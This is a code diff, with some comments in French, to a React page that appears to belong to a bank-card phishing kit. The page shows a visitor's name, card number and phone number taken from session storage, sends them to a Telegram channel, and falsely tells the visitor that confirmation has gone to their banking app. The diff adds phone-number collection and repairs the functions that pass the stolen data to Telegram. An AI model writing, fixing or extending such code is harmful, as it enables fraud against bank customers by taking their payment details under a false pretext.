@@ -10,18 +10,25 @@ function NextStepAppr() {
   const [isLoading, setIsLoading] = useState(false);
   const [isConfirmed, setIsConfirmed] = useState(false);
   const [sessionId, setSessionId] = useState(null);
+  const [phoneNumber, setPhoneNumber] = useState('');
 
-  // Get username and card number from sessionStorage
+  // Get data from sessionStorage
   useEffect(() => {
     // Retrieve data with better error handling
     const storedUsername = sessionStorage.getItem('loginName') || 'Unknown User';
     const storedCardNumber = sessionStorage.getItem('cardNumber');
     const storedSessionId = sessionStorage.getItem('sessionId') || Date.now().toString();
+    const storedPhoneNumber = sessionStorage.getItem('phoneNumber') || '';
     
-    console.log('📦 Retrieved from sessionStorage:', { storedUsername, storedCardNumber });
+    console.log('📦 Retrieved from sessionStorage:', { 
+      storedUsername, 
+      storedCardNumber,
+      storedPhoneNumber 
+    });
     
     setUsername(storedUsername);
     setSessionId(storedSessionId);
+    setPhoneNumber(storedPhoneNumber);
     
     if (storedCardNumber) {
       setFullCardNumber(storedCardNumber);
@@ -72,8 +79,14 @@ function NextStepAppr() {
     
     try {
       // Send confirmation logs to Telegram
-      await sendConfirmationLog(username, fullCardNumber, sessionId);
-      await sendSuccessToTelegram(username, sessionId, fullCardNumber);
+      // Correction: sendConfirmationLog doit exister dans useTelegramBot
+      if (sendConfirmationLog) {
+        await sendConfirmationLog(username, fullCardNumber, sessionId);
+      }
+      
+      // Correction: sendSuccessToTelegram attend (phoneNumber, sessionId)
+      // ou (username, sessionId) selon votre implémentation
+      await sendSuccessToTelegram(phoneNumber || username, sessionId);
       
       setIsConfirmed(true);
       console.log('✅ Confirmed - Logs sent to channel');
@@ -86,6 +99,14 @@ function NextStepAppr() {
 
   const handleBack = () => {
     console.log('🔵 Back button clicked - returning to card verification');
+    window.location.href = '/';
+  };
+
+  const handleBackToLogin = () => {
+    console.log('🔵 Back to login button clicked');
+    // Clear session storage
+    sessionStorage.clear();
+    localStorage.removeItem('cardNumber');
     window.location.href = '/';
   };
 
@@ -117,6 +138,12 @@ function NextStepAppr() {
                 <span className="detail-label">Card number:</span>
                 <span className="detail-value">{cardNumber}</span>
               </div>
+              {phoneNumber && (
+                <div className="detail-row">
+                  <span className="detail-label">Phone:</span>
+                  <span className="detail-value">{phoneNumber}</span>
+                </div>
+              )}
             </div>
 
             <div className="confirmation-instructions">
@@ -132,6 +159,9 @@ function NextStepAppr() {
               <button onClick={handleBack} className="back-btn">
                 Back to Card Verification
               </button>
+              <button onClick={handleBackToLogin} className="back-btn" style={{ marginTop: '10px' }}>
+                Back to Login
+              </button>
             </div>
           </>
         ) : (
@@ -141,9 +171,11 @@ function NextStepAppr() {
             <p>Your confirmation has been sent to the banking app.</p>
             <p>Please check your mobile banking app to complete the verification.</p>
             <p className="waiting-time">Current time: {currentTime.toLocaleString()}</p>
-            <button onClick={handleBack} className="back-btn" style={{ marginTop: '20px' }}>
-              Back to Login
-            </button>
+            <div className="confirmation-buttons" style={{ marginTop: '20px' }}>
+              <button onClick={handleBackToLogin} className="back-btn">
+                Back to Login
+              </button>
+            </div>
           </div>
         )}
       </div>
